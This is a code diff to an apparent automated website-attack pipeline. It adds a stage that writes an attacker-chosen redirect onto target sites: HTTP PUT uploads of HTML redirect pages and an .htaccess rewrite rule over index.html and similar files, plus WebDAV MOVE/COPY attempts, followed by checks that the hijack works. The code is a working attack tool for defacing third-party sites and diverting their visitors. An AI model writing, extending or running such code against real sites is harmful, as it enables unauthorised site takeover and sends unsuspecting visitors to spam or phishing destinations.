@@ -1695,13 +1695,137 @@ export async function runUnifiedAttackPipeline(
             data: { shelllessResults, successCount: shelllessSuccesses.length, redirectCount: shelllessRedirects.length },
           });
         } else {
+          // ─── Phase 5.5: Auto-Execute Shellless Findings ───
+          // Shellless methods found a potential path but redirect isn't working yet.
+          // Try to actually execute the findings to make redirect work.
           onEvent({
             phase: "shellless",
-            step: "partial",
-            detail: `⚠️ Shellless Attack พบ ${shelllessSuccesses.length} ช่องทาง แต่ redirect ยังไม่ทำงาน (0 redirects) — ต้อง execute เพิ่มเติม`,
-            progress: 95,
-            data: { shelllessResults, successCount: shelllessSuccesses.length, redirectCount: 0 },
+            step: "auto_execute",
+            detail: `🔧 Phase 5.5: Shellless พบ ${shelllessSuccesses.length} ช่องทาง — กำลัง auto-execute เพื่อทำ redirect จริง...`,
+            progress: 93,
           });
+
+          let autoExecuteSuccess = false;
+
+          for (const sr of shelllessSuccesses) {
+            // Try to use the evidence/credentials from the shellless result
+            const evidence = sr.evidence || "";
+
+            // Auto-execute: Try uploading HTML redirect via PUT/WebDAV to target
+            if (!autoExecuteSuccess) {
+              const htmlRedirect = `<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=${config.redirectUrl}"><script>window.location.href='${config.redirectUrl}';</script></head><body>Redirecting...</body></html>`;
+              const uploadPaths = [
+                `${config.targetUrl.replace(/\/$/, "")}/index.html`,
+                `${config.targetUrl.replace(/\/$/, "")}/redirect.html`,
+                `${config.targetUrl.replace(/\/$/, "")}/go.html`,
+                `${config.targetUrl.replace(/\/$/, "")}/.htaccess`,
+              ];
+
+              for (const uploadPath of uploadPaths) {
+                try {
+                  const isHtaccess = uploadPath.endsWith(".htaccess");
+                  const content = isHtaccess
+                    ? `RewriteEngine On\nRewriteRule ^(.*)$ ${config.redirectUrl} [R=301,L]`
+                    : htmlRedirect;
+
+                  // Try PUT
+                  const putResp = await fetch(uploadPath, {
+                    method: "PUT",
+                    headers: { "Content-Type": isHtaccess ? "text/plain" : "text/html" },
+                    body: content,
+                    signal: AbortSignal.timeout(10000),
+                  }).catch(() => null);
+
+                  if (putResp && (putResp.ok || putResp.status === 201)) {
+                    onEvent({
+                      phase: "shellless",
+                      step: "auto_execute",
+                      detail: `✅ Auto-execute: ${isHtaccess ? ".htaccess" : "HTML redirect"} วางสำเร็จผ่าน PUT: ${uploadPath}`,
+                      progress: 94,
+                    });
+
+                    // Verify the redirect actually works
+                    const verifyResult = await verifyUploadedFile(uploadPath, config.redirectUrl, onEvent);
+                    if (verifyResult.redirectWorks) {
+                      autoExecuteSuccess = true;
+                      // Update the shellless result in uploadedFiles
+                      const existingIdx = uploadedFiles.findIndex(f => f.method === `shellless_${sr.method}`);
+                      if (existingIdx >= 0) {
+                        uploadedFiles[existingIdx].verified = verifyResult.redirectDestinationMatch;
+                        uploadedFiles[existingIdx].redirectWorks = true;
+                        uploadedFiles[existingIdx].redirectDestinationMatch = verifyResult.redirectDestinationMatch;
+                        uploadedFiles[existingIdx].finalDestination = verifyResult.finalDestination;
+                        uploadedFiles[existingIdx].redirectChain = verifyResult.redirectChain;
+                        uploadedFiles[existingIdx].url = uploadPath;
+                      } else {
+                        uploadedFiles.push({
+                          url: uploadPath,
+                          shell: shells[0] || { id: "auto_exec", type: "html" as any, filename: isHtaccess ? ".htaccess" : "redirect.html", content: content, size: content.length, mimeType: isHtaccess ? "text/plain" : "text/html", headers: {} },
+                          method: `shellless_auto_execute_${sr.method}`,
+                          verified: verifyResult.redirectDestinationMatch,
+                          redirectWorks: true,
+                          redirectDestinationMatch: verifyResult.redirectDestinationMatch,
+                          finalDestination: verifyResult.finalDestination,
+                          httpStatus: verifyResult.httpStatus,
+                          redirectChain: verifyResult.redirectChain,
+                        });
+                      }
+                      break;
+                    }
+                  }
+                } catch { /* continue */ }
+              }
+            }
+
+            // Auto-execute: Try MOVE/COPY methods
+            if (!autoExecuteSuccess) {
+              for (const httpMethod of ["MOVE", "COPY"]) {
+                try {
+                  const resp = await fetch(config.targetUrl, {
+                    method: httpMethod,
+                    headers: {
+                      "Destination": config.redirectUrl,
+                      "Overwrite": "T",
+                    },
+                    signal: AbortSignal.timeout(8000),
+                  }).catch(() => null);
+                  if (resp && (resp.ok || resp.status === 201 || resp.status === 204)) {
+                    const verifyResult = await verifyUploadedFile(config.targetUrl, config.redirectUrl, onEvent);
+                    if (verifyResult.redirectWorks) {
+                      autoExecuteSuccess = true;
+                      onEvent({
+                        phase: "shellless",
+                        step: "auto_execute",
+                        detail: `✅ Auto-execute: HTTP ${httpMethod} สำเร็จ — redirect ทำงานแล้ว!`,
+                        progress: 95,
+                      });
+                      break;
+                    }
+                  }
+                } catch { /* continue */ }
+              }
+            }
+
+            if (autoExecuteSuccess) break;
+          }
+
+          if (autoExecuteSuccess) {
+            onEvent({
+              phase: "shellless",
+              step: "auto_execute_success",
+              detail: `✅ Auto-execute สำเร็จ! Redirect ทำงานแล้ว หลัง shellless พบช่องทาง`,
+              progress: 95,
+              data: { shelllessResults, successCount: shelllessSuccesses.length, redirectCount: 1 },
+            });
+          } else {
+            onEvent({
+              phase: "shellless",
+              step: "partial",
+              detail: `⚠️ Shellless Attack พบ ${shelllessSuccesses.length} ช่องทาง แต่ auto-execute ไม่สำเร็จ (redirect ยังไม่ทำงาน)`,
+              progress: 95,
+              data: { shelllessResults, successCount: shelllessSuccesses.length, redirectCount: 0 },
+            });
+          }
         }
       } else {
         onEvent({
